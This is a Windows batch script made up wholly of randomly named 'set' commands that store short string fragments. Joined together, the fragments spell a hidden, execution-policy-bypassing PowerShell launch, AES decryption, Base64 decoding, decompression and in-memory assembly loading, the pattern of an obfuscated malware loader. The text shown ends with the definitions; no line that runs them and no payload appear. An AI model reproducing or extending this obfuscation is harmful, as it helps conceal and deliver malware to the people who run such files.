@echo off
set "VBXlsWFKXV=s\"
set "ekHtLIzaLn=ll"
set "oOshYowfbU=po"
set "AgwCfuylcc=Sy"
set "zmVhMKBYyy=nd"
set "dLkgvcgUDA=py"
set "GttPNvhEXr=:\"
set "eOwlYdiDBS=do"
set "zDLWGEleLi=rs"
set "kgtqgMvyKi=\W"
set "TjgyBkjWTT=st"
set "iVduDGfXUO=Wi"
set "oKDTSXpJPQ=em"
set "CRZGdvZXWh=Po"
set "tfjWvzxQXq=y "
set "BqbpbSCwAu=he"
set "udUuuYlfUO=ll"
set "IZUNJirmMg=ws"
set "gZzUcwJhsd=we"
set "csuTtdGtRc=xe"
set "PYMhAJrvta=ow"
set "ERXRANOdux=rS"
set "ykTJBLThgp=\v"
set "HlIqBvJrCH= /"
set "tGyafSocMh=co"
set "NJRdGQCCJh=in"
set "eQaCXJBjbg=32"
set "GUYPYtjDgR=0\"
set "MbSkrKcwAt=.e"
set "HVDyIQjVoO=1."
set "RJfACGdqqE= C"
set "yqPDFnPPiC=he"
set "tHITVjHiKV=we"
set "vJDzeQIEMJ= %~dp0"
set "vMEFlQDkjr=cd"
set "ummtPbTNEH=.Mod"
set "OngksrsUpT=[Sys"
set "ZgmaiJMSHr=]::N"
set "pqNwrqXBrw=yste"
set "IkihyOYNEc=k; }"
set "ZJRrjRpRWF=$PyH"
set "EKbEpbdfmw=ay()"
set "AWcwBalOtP=)($I"
set "tmfNIHwzba=yHhU"
set "jKzFViZJkk=lit("
set "hlTOHAsFjs=tem."
set "XhxtdNIjIj=VkXU"
set "KZwWnwtwBp=dj0C"
set "SIiiaDvdZB=ILWM"
set "swJelYfYlt=oL'["
set "abBwFlpsjV=ke($"
set "xgYfGmrGEL=sqeq"
set "loiYikuBSx=Mode"
set "bSgVuCEuKb=MX ="
set "AgeTgQIObO=g = "
set "dzNUYoGTHf= '')"
set "GnwsyrCowO=.IO."
set "APMXoywEfD=$bGF"
set "iYrBiDQHBB=c) {"
set "STaYQlcUuC=RmAx"
set "YQyuREIOWK=$ILW"
set "lLyeSZuINx=YxVw"
set "TfpqnqckvT=($VO"
set "cgDxKgvBYj=pher"
set "XVceYIXIOb=yHhU"
set "QoHpbkAYmf=gsYZ"
set "vRAyXVkfid=)))"
set "LUxyXPFULQ=] -j"
set "npHjomAgWV=('%*'"
set "cNUMdVzuFE=eqQ "
set "eTTXejZxSD=Syst"
set "SKruQgUulo=);$x"
set "ZoPGUSMhjz=fore"
set "vaopyyqWoL=RoFV"
set "aKpnxDrCSn=ct S"
set "AGDhVNGWSA=ddin"
set "WExWHsypDI=();$"
set "fAwTsaftUd=y.Ci"
set "jnkPtZczVx=bypa"
set "HqAStVYDRg=tem."
set "WJtYATfVhA=XPBG"
set "bycuFCPpZb=.Len"
set "PopOcMCSYH=ion."
set "yeqBAYWDNu=n ''"
set "nAYSsiJNPI=($VO"
set "pswxKvQCBG=brea"
set "YQxykzsvsM=ne);"
set "FxYfoYjBLe=Bmor"
set "hlWHixofBj=d;$P"
set "oqznSXXbVx=Disp"
set "AxuyxtIYoN=7;$P"
set "AWTHjgsZuq=yHhU"
set "VTvqZbdKpq=-1.."
set "zoABLoRSsN=vert"
set "NMCiQpAwzd=3); "
set "TXfUevMkqo=.Sec"
set "LebKxuzVyg=xXPB"
set "SFHicNiLpx=ck($"
set "OFZbnGQfce=embl"
set "XjNxUeDsTJ=comm"
set "XqGQFpFPYQ=]::C"
set "vPpeqcfAQt=ionM"
set "kYBrvXfbSX==');"
set "dXwQAXHDxz=S46e"
set "gVNefQryKi=PyHh"
set "bdbXJgxqVB=$RoF"
set "rIDpJYWLVl=morF"
set "BvoIJbOaCT=ew-O"
set "RvOysYQFcR=.Cry"
set "EFIMqdJjQf=[IO."
set "NCuhavbUhL=.Cry"
set "bGLVApQoQn=tryP"
set "hTHsblXuTW=::('"
set "NtHxIzNbZb=cj);"
set "ruoSfeTwbg=Comp"
set "cCLaGrvjcK=y.Cr"
set "GUfvpcQNkw=.Cre"
set "YVNUXKSvPW=;$Xh"
set "acNYyUaCxV=zuZI"
set "TKZiIinnNk='txe"
set "ffqpPlBqRK=mory"
set "hcLBeivMoF=6esa"
set "bqZqlDSVdI=G = "
set "zPlosCGQaQ=em.I"
set "LCNAGOGBxu=e = "
set "SsUMvDGrNw=('da"
set "vKmlpQxuuu=ecry"
set "DfazaLZyuN=tion"
set "ZmZmOfKiwV=ose("
set "ZSJccIXNcu=oryS"
set "mGNxyfnqjW=gth)"
set "UswOmRoqtx=[Sys"
set "SciWqmwuDC=  $a"
set "rIKvYAJvFD=Obje"
set "mFGNbjkExC=;$NS"
